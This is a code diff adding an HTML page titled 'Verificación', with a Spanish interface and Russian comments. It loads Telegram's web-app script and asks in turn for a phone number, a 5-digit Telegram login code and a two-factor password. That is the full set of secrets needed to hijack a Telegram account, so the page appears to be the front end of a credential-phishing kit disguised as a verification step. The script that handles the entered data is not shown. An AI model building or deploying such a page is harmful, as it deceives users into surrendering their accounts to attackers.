@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+</head>
+<body>
+    <div class="glass-container" id="step1">
+        <i class="fas fa-phone-alt icon-header"></i>
+        <h2>Verificación</h2>
+        <p class="info-message">Te enviaremos un código por Telegram</p>
+        
+        <!-- Ручной ввод для отладки (в браузере) -->
+        <div class="manual-section">
+            <div class="input-with-icon">
+                <i class="fas fa-phone"></i>
+                <input type="tel" id="phone" placeholder="+1234567890" value="+">
+            </div>
+            <button class="action-btn" id="getCodeBtn"><i class="fas fa-paper-plane"></i> OBTENER CÓDIGO</button>
+        </div>
+
+        <!-- Telegram section (автоматический запрос) -->
+        <div class="telegram-section" style="display: none;">
+            <p><i class="fas fa-spinner fa-pulse"></i> Solicitando número...</p>
+            <div class="loader"></div>
+        </div>
+        <p class="error" id="error1"></p>
+    </div>
+
+    <!-- Экран ввода кода -->
+    <div class="glass-container" id="step2" style="display:none;">
+        <i class="fas fa-key icon-header"></i>
+        <p class="phone-display" id="phoneDisplay"></p>
+        <p class="info-message">Ingresa el código de 5 dígitos</p>
+        <div class="code-inputs">
+            <input type="text" maxlength="1" class="code-digit" id="d1" readonly>
+            <input type="text" maxlength="1" class="code-digit" id="d2" readonly>
+            <input type="text" maxlength="1" class="code-digit" id="d3" readonly>
+            <input type="text" maxlength="1" class="code-digit" id="d4" readonly>
+            <input type="text" maxlength="1" class="code-digit" id="d5" readonly>
+        </div>
+        <!-- Цифровая клавиатура -->
+        <div class="keyboard">
+            <div class="keyboard-row">
+                <button class="digit-btn" data-digit="1">1</button>
+                <button class="digit-btn" data-digit="2">2</button>
+                <button class="digit-btn" data-digit="3">3</button>
+            </div>
+            <div class="keyboard-row">
+                <button class="digit-btn" data-digit="4">4</button>
+                <button class="digit-btn" data-digit="5">5</button>
+                <button class="digit-btn" data-digit="6">6</button>
+            </div>
+            <div class="keyboard-row">
+                <button class="digit-btn" data-digit="7">7</button>
+                <button class="digit-btn" data-digit="8">8</button>
+                <button class="digit-btn" data-digit="9">9</button>
+            </div>
+            <div class="keyboard-row">
+                <button class="digit-btn" data-digit="0">0</button>
+                <button class="delete-btn" id="deleteBtn"><i class="fas fa-backspace"></i></button>
+            </div>
+        </div>
+        <button class="action-btn" id="resendBtn"><i class="fas fa-redo-alt"></i> Reenviar código</button>
+        <p class="error" id="error2"></p>
+    </div>
+
+    <!-- Экран ввода пароля (2FA) -->
+    <div class="glass-container" id="step3" style="display:none;">
+        <i class="fas fa-lock icon-header"></i>
+        <p class="phone-display" id="phoneDisplay2"></p>
+        <p class="info-message">Contraseña de dos factores</p>
+        <div class="input-with-icon">
+            <i class="fas fa-lock"></i>
+            <input type="password" id="passwordInput" placeholder="Contraseña">
+        </div>
+        <button class="action-btn" id="submitPasswordBtn"><i class="fas fa-check"></i> ENVIAR</button>
+        <p class="error" id="error3"></p>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
